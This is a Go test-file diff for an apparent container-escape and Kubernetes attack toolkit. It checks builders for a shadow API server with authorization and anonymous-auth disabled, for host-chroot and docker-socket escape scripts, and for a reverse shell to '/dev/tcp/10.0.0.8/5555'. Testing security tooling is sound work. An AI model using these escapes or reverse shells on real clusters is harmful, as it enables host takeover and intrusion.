@@ -94,6 +94,9 @@ func TestEscapePodYAMLMarshalsToValidPod(t *testing.T) {
 	if err != nil {
 		t.Fatalf("expected pod yaml to marshal, got error: %v", err)
 	}
+	if !strings.Contains(string(body), "apiVersion: v1") || !strings.Contains(string(body), "kind: Pod") {
+		t.Fatalf("expected marshaled yaml to include apiVersion/kind, got:\n%s", string(body))
+	}
 
 	jsonBody, err := yaml.YAMLToJSON(body)
 	if err != nil {
@@ -205,6 +208,89 @@ func TestBuildShadowAPIServerPodCopiesKeyRuntimeData(t *testing.T) {
 	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--authorization-mode=AlwaysAllow") {
 		t.Fatalf("expected auth mode override, got %#v", shadow.Spec.Containers[0].Args)
 	}
+	if shadow.TypeMeta.APIVersion != "v1" || shadow.TypeMeta.Kind != "Pod" {
+		t.Fatalf("expected shadow pod TypeMeta to be set, got %#v", shadow.TypeMeta)
+	}
+}
+
+func TestBuildShadowAPIServerPodRewritesFlagsWhenStaticPodStoresThemInCommand(t *testing.T) {
+	source := corev1.Pod{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "kube-apiserver-node1",
+			Namespace: "kube-system",
+			Labels:    map[string]string{"component": "kube-apiserver", "tier": "control-plane"},
+		},
+		Spec: corev1.PodSpec{
+			NodeName: "node-1",
+		},
+	}
+	container := corev1.Container{
+		Name:  "kube-apiserver",
+		Image: "registry.k8s.io/kube-apiserver:v1.29.0",
+		Command: []string{
+			"kube-apiserver",
+			"--authorization-mode=Node,RBAC",
+			"--anonymous-auth=false",
+			"--secure-port=6443",
+			"--etcd-servers=https://127.0.0.1:2379",
+		},
+	}
+
+	shadow, warnings := buildShadowAPIServerPod(source, container)
+	if len(warnings) != 0 {
+		t.Fatalf("expected static-pod command flags to be normalized without warnings, got %#v", warnings)
+	}
+	if got := shadow.Spec.Containers[0].Command; len(got) != 1 || got[0] != "kube-apiserver" {
+		t.Fatalf("expected command to keep only the executable, got %#v", got)
+	}
+	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--authorization-mode=AlwaysAllow") {
+		t.Fatalf("expected authorization mode override in args, got %#v", shadow.Spec.Containers[0].Args)
+	}
+	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--anonymous-auth=true") {
+		t.Fatalf("expected anonymous auth override in args, got %#v", shadow.Spec.Containers[0].Args)
+	}
+	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--secure-port=9444") {
+		t.Fatalf("expected secure port override in args, got %#v", shadow.Spec.Containers[0].Args)
+	}
+	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--etcd-servers=https://127.0.0.1:2379") {
+		t.Fatalf("expected etcd servers to remain in args, got %#v", shadow.Spec.Containers[0].Args)
+	}
+}
+
+func TestPodLooksLikeAPIServerRejectsOtherControlPlanePods(t *testing.T) {
+	if podLooksLikeAPIServer(corev1.Pod{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "kube-controller-manager-node1",
+			Namespace: "kube-system",
+			Labels:    map[string]string{"tier": "control-plane"},
+		},
+		Spec: corev1.PodSpec{
+			Containers: []corev1.Container{{
+				Name:  "kube-controller-manager",
+				Image: "registry.k8s.io/kube-controller-manager:v1.29.0",
+				Args:  []string{"--cluster-name=demo"},
+			}},
+		},
+	}) {
+		t.Fatal("expected controller-manager pod to be rejected")
+	}
+
+	if !podLooksLikeAPIServer(corev1.Pod{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "kube-apiserver-node1",
+			Namespace: "kube-system",
+			Labels:    map[string]string{"tier": "control-plane"},
+		},
+		Spec: corev1.PodSpec{
+			Containers: []corev1.Container{{
+				Name:  "kube-apiserver",
+				Image: "registry.k8s.io/kube-apiserver:v1.29.0",
+				Args:  []string{"--etcd-servers=https://127.0.0.1:2379"},
+			}},
+		},
+	}) {
+		t.Fatal("expected apiserver pod to be detected")
+	}
 }
 
 func TestEvaluatePodSummaryDetectsSeccompDisabled(t *testing.T) {
@@ -232,6 +318,37 @@ func TestEvaluatePodSummaryInfoOnlyDoesNotEscalateToHigh(t *testing.T) {
 	}
 }
 
+func TestBuildEvaluatePodScriptSupportsCurlOrWget(t *testing.T) {
+	script := buildEvaluatePodScript()
+	for _, needle := range []string{
+		"command -v curl",
+		"command -v wget",
+		"--max-time 2",
+		"-T 2",
+		"/version",
+		"gitVersion",
+		"no_http_client",
+		"ps -eo comm",
+		"grep -Ev ' on /(etc/hosts|etc/hostname|etc/resolv.conf) '",
+		"containerd",
+		"=== CDK EVALUATE START ===",
+		"=== CDK EVALUATE END ===",
+	} {
+		if !strings.Contains(script, needle) {
+			t.Fatalf("expected evaluate script to contain %q, got:\n%s", needle, script)
+		}
+	}
+}
+
+func TestHasHostRootAccessOnlyMatchesRootHostPath(t *testing.T) {
+	if !hasHostRootAccess([]string{"privileged", "hostPath:/"}) {
+		t.Fatal("expected host root mount to be detected")
+	}
+	if hasHostRootAccess([]string{"hostPath:/proc", "hostPID"}) {
+		t.Fatal("expected non-root hostPath mounts to stay false")
+	}
+}
+
 func TestAutoEscapeHostCommandAvoidsPlaceholderLHOST(t *testing.T) {
 	if got := autoEscapeHostCommand("", ""); got != "echo ESCAPED_TO_HOST; id; hostname" {
 		t.Fatalf("expected local confirmation command without placeholder host, got %q", got)
@@ -242,6 +359,72 @@ func TestAutoEscapeHostCommandAvoidsPlaceholderLHOST(t *testing.T) {
 	}
 	if !strings.Contains(withReverse, "ESCAPED_TO_HOST") {
 		t.Fatalf("expected reverse-shell command to keep host escape evidence, got %q", withReverse)
+	}
+}
+
+func TestAutoEscapeChrootCommandsReuseReverseShellTarget(t *testing.T) {
+	for _, script := range []string{
+		autoEscapeDiskChrootCommand("10.0.0.8", "5555"),
+		autoEscapeMountedHostCommand("/host", "10.0.0.8", "5555"),
+	} {
+		if !strings.Contains(script, "/dev/tcp/10.0.0.8/5555") {
+			t.Fatalf("expected script to preserve provided reverse-shell target, got %q", script)
+		}
+		if !strings.Contains(script, "ESCAPED_TO_HOST") {
+			t.Fatalf("expected script to retain host escape marker, got %q", script)
+		}
+	}
+}
+
+func TestAutoEscapeMountedHostCommandChecksForChrootBinary(t *testing.T) {
+	script := autoEscapeMountedHostCommand("/host", "10.0.0.8", "5555")
+	if !strings.Contains(script, "MISSING_BINARY:chroot") {
+		t.Fatalf("expected mounted-host escape to report missing chroot, got %q", script)
+	}
+	if !strings.Contains(script, "'/host'/bin") {
+		t.Fatalf("expected mounted-host escape to use provided mount path, got %q", script)
+	}
+}
+
+func TestBuildDockerSockAutoEscapeCommandSupportsDockerAndCurl(t *testing.T) {
+	script := buildDockerSockAutoEscapeCommand("/tmp/docker.sock", "10.0.0.8", "5555")
+	for _, needle := range []string{
+		"command -v docker",
+		"command -v curl",
+		"SOCK='/tmp/docker.sock'",
+		"--unix-socket \"$SOCK\"",
+		"containers/create",
+		"containers/$CID/logs",
+		"MISSING_BINARY:docker_or_curl",
+		"ESCAPED_TO_HOST",
+	} {
+		if !strings.Contains(script, needle) {
+			t.Fatalf("expected docker-sock auto escape script to contain %q, got %q", needle, script)
+		}
+	}
+}
+
+func TestCategorizeServiceMarksRemoteAccessAndSuspiciousNames(t *testing.T) {
+	category, risk := categorizeService("ssh-access", corev1.ServiceTypeNodePort, []corev1.ServicePort{{Port: 2222}})
+	if category != "remote-access" || risk != "high" {
+		t.Fatalf("expected ssh-access service to be high-risk remote access, got %q/%q", category, risk)
+	}
+	category, risk = categorizeService("hecker-svc", corev1.ServiceTypeClusterIP, []corev1.ServicePort{{Port: 8080}})
+	if category != "suspicious" || risk != "high" {
+		t.Fatalf("expected suspicious service naming to be highlighted, got %q/%q", category, risk)
+	}
+}
+
+func TestNormalizeContainerEntrypointTreatsStaticPodCommandFlagsAsArgs(t *testing.T) {
+	command, args := normalizeContainerEntrypoint(
+		[]string{"kube-apiserver", "--authorization-mode=Node,RBAC", "--secure-port=6443"},
+		nil,
+	)
+	if len(command) != 1 || command[0] != "kube-apiserver" {
+		t.Fatalf("expected executable-only command, got %#v", command)
+	}
+	if len(args) != 2 || args[0] != "--authorization-mode=Node,RBAC" || args[1] != "--secure-port=6443" {
+		t.Fatalf("expected flags to move into args, got %#v", args)
 	}
 }
 
